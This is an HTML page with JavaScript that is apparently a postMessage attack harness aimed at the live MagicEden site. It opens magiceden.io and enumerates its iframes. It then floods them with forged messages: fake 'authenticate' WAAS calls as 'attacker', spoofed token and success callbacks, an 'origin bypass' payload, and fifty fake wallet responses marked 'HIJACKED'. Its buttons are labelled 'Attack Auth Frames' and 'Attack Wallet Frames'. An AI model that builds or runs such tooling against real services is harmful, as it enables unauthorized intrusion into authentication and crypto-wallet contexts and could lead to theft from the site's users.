<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>MagicEden Iframe Analysis</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1400px;
            margin: 20px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        
        h1 { color: #333; }
        
        .info-box {
            background: #d1ecf1;
            border-left: 4px solid #0c5460;
            padding: 15px;
            margin: 20px 0;
        }
        
        .findings {
            background: #fff3cd;
            border-left: 4px solid #856404;
            padding: 15px;
            margin: 20px 0;
        }
        
        .test-section {
            background: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        button {
            background: #dc3545;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
            font-weight: bold;
        }
        
        button:hover {
            background: #c82333;
        }
        
        button.info {
            background: #17a2b8;
        }
        
        button.info:hover {
            background: #138496;
        }
        
        #iframe-list {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 13px;
        }
        
        #log {
            background: #1e1e1e;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 13px;
            height: 500px;
            overflow-y: auto;
            margin-top: 20px;
        }
        
        .received { color: #4ade80; font-weight: bold; }
        .sent { color: #60a5fa; }
        .error { color: #f87171; font-weight: bold; }
        .warning { color: #fbbf24; font-weight: bold; }
    </style>
</head>
<body>
    <h1>üîç MagicEden Iframe & Window Analysis</h1>
    
    <div class="info-box">
        <strong>Strategy:</strong> The vulnerable listeners might be in iframes, not the main window.<br>
        Let's enumerate all frames and try to message them directly.
    </div>
    
    <div class="findings">
        <strong>Known Vulnerable Frames:</strong><br>
        ‚Ä¢ auth.magiceden.io (has WAAS listeners)<br>
        ‚Ä¢ Wallet connect iframes<br>
        ‚Ä¢ Other embedded contexts
    </div>
    
    <div class="test-section">
        <h3>Step 1: Open MagicEden & Wait</h3>
        <button onclick="openTarget()" class="info">Open MagicEden</button>
        <p id="open-status">Not opened yet</p>
    </div>
    
    <div class="test-section">
        <h3>Step 2: Enumerate All Frames</h3>
        <button onclick="enumerateFrames()" class="info">List All Iframes</button>
        <div id="iframe-list">No frames enumerated yet</div>
    </div>
    
    <div class="test-section">
        <h3>Step 3: Message All Frames</h3>
        <button onclick="messageAllFrames()">üí£ Message Every Frame</button>
        <p>Sends test messages to main window + all iframes</p>
    </div>
    
    <div class="test-section">
        <h3>Step 4: Targeted Attacks on Specific Frames</h3>
        <button onclick="attackAuthFrames()">üéØ Attack Auth Frames</button>
        <button onclick="attackWalletFrames()">üí∞ Attack Wallet Frames</button>
    </div>
    
    <div id="log"></div>
    <button onclick="clearLog()" style="background: #28a745;">Clear Log</button>
    
    <script>
        let targetWindow = null;
        let frameList = [];
        let msgCount = 0;
        
        function log(msg, type = 'sent') {
            const div = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            div.innerHTML += '<div class="' + type + '">[' + time + '] ' + msg + '</div>';
            div.scrollTop = div.scrollHeight;
            console.log(msg);
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
            msgCount = 0;
        }
        
        // Global message listener
        window.addEventListener('message', function(e) {
            msgCount++;
            log('üì® #' + msgCount + ' FROM: ' + e.origin, 'received');
            log('   ' + JSON.stringify(e.data).substring(0, 150), 'received');
            
            const str = JSON.stringify(e.data);
            if (str.includes('error')) log('   üö® ERROR!', 'error');
            if (str.includes('success') || str.includes('returnValue')) log('   ‚ö° CALLBACK!', 'error');
            if (str.includes('wallet') || str.includes('waas')) log('   üí∞ WALLET!', 'warning');
        });
        
        // Step 1: Open target
        function openTarget() {
            log('Opening MagicEden...', 'warning');
            targetWindow = window.open('https://magiceden.io', 'magiceden');
            document.getElementById('open-status').textContent = 'Opened! Wait 15 seconds then enumerate frames...';
            document.getElementById('open-status').style.color = 'green';
            
            setTimeout(function() {
                log('‚úÖ Page should be loaded now', 'received');
                document.getElementById('open-status').textContent = 'Ready! Click "List All Iframes"';
            }, 15000);
        }
        
        // Step 2: Enumerate frames
        function enumerateFrames() {
            if (!targetWindow) {
                alert('Open MagicEden first!');
                return;
            }
            
            log('=== ENUMERATING FRAMES ===', 'warning');
            frameList = [];
            
            try {
                // Try to access frames
                log('Main window: ' + targetWindow.location.href, 'received');
                frameList.push({type: 'main', ref: targetWindow, url: targetWindow.location.href});
            } catch(e) {
                log('Main window (cross-origin, cannot access URL)', 'received');
                frameList.push({type: 'main', ref: targetWindow, url: 'cross-origin'});
            }
            
            // Try to enumerate iframes
            try {
                const frames = targetWindow.frames;
                log('Found ' + frames.length + ' frames', 'received');
                
                for (let i = 0; i < frames.length; i++) {
                    try {
                        const url = frames[i].location.href;
                        log('  Frame ' + i + ': ' + url, 'received');
                        frameList.push({type: 'iframe', index: i, ref: frames[i], url: url});
                    } catch(e) {
                        log('  Frame ' + i + ': (cross-origin)', 'received');
                        frameList.push({type: 'iframe', index: i, ref: frames[i], url: 'cross-origin'});
                    }
                }
            } catch(e) {
                log('Cannot enumerate frames: ' + e.message, 'error');
            }
            
            // Update display
            let html = 'Found ' + frameList.length + ' targets:<br>';
            frameList.forEach(function(f, i) {
                html += (i + 1) + '. ' + f.type + ' - ' + f.url + '<br>';
            });
            document.getElementById('iframe-list').innerHTML = html;
            
            log('‚úÖ Enumeration complete: ' + frameList.length + ' targets', 'received');
        }
        
        // Step 3: Message all frames
        function messageAllFrames() {
            if (frameList.length === 0) {
                alert('Enumerate frames first!');
                return;
            }
            
            log('=== MESSAGING ALL FRAMES ===', 'warning');
            
            const testMessages = [
                {test: 'hello', from: 'attacker'},
                {id: '1', data: 'test'},
                {source: 'K', data: 'r'},
                {waasCall: {command: 'test'}},
                {origin: 'host', type: 'test'},
                'iframe-ready-test'
            ];
            
            frameList.forEach(function(frame, idx) {
                log('Messaging target ' + (idx + 1) + ' (' + frame.type + ')...');
                
                testMessages.forEach(function(msg) {
                    try {
                        frame.ref.postMessage(msg, '*');
                    } catch(e) {
                        log('  Error: ' + e.message, 'error');
                    }
                });
            });
            
            log('‚úÖ Sent ' + (testMessages.length * frameList.length) + ' messages', 'received');
        }
        
        // Step 4a: Attack auth frames
        function attackAuthFrames() {
            if (frameList.length === 0) {
                alert('Enumerate frames first!');
                return;
            }
            
            log('=== ATTACKING AUTH FRAMES ===', 'error');
            
            frameList.forEach(function(frame, idx) {
                if (frame.url.includes('auth') || frame.url === 'cross-origin') {
                    log('Attacking target ' + (idx + 1) + '...');
                    
                    // WAAS patterns
                    frame.ref.postMessage({
                        waasCall: {
                            command: 'authenticate',
                            parameter: {user: 'attacker'},
                            version: '1.0',
                            callId: 'hijack123'
                        }
                    }, '*');
                    
                    frame.ref.postMessage({
                        waasReturn: {
                            returnValue: {token: 'FAKE'},
                            success: true,
                            callId: '1'
                        }
                    }, '*');
                    
                    // Origin bypass
                    frame.ref.postMessage({
                        origin: 'host',
                        type: 'command',
                        data: 'malicious'
                    }, '*');
                    
                    log('  Sent WAAS/auth messages');
                }
            });
            
            log('‚úÖ Auth attack complete', 'received');
        }
        
        // Step 4b: Attack wallet frames
        function attackWalletFrames() {
            if (frameList.length === 0) {
                alert('Enumerate frames first!');
                return;
            }
            
            log('=== ATTACKING WALLET FRAMES ===', 'error');
            
            frameList.forEach(function(frame, idx) {
                log('Attacking target ' + (idx + 1) + '...');
                
                // Callback injection
                for (let i = 0; i < 50; i++) {
                    frame.ref.postMessage({
                        id: i,
                        returnValue: 'HIJACKED',
                        success: true,
                        wallet: 'attacker'
                    }, '*');
                }
                
                // Source/data pattern
                frame.ref.postMessage({source: 'K', data: 'r'}, '*');
                frame.ref.postMessage({source: 'W', data: 'r'}, '*');
                frame.ref.postMessage({source: 'eV', data: 'r'}, '*');
                
                log('  Sent 50+ wallet messages');
            });
            
            log('‚úÖ Wallet attack complete', 'received');
        }
        
        log('üéØ Iframe Analysis Suite Ready');
        log('STEP 1: Click "Open MagicEden"');
        log('STEP 2: Wait 15 seconds');
        log('STEP 3: Click "List All Iframes"');
        log('STEP 4: Click attack buttons');
    </script>
</body>
</html>
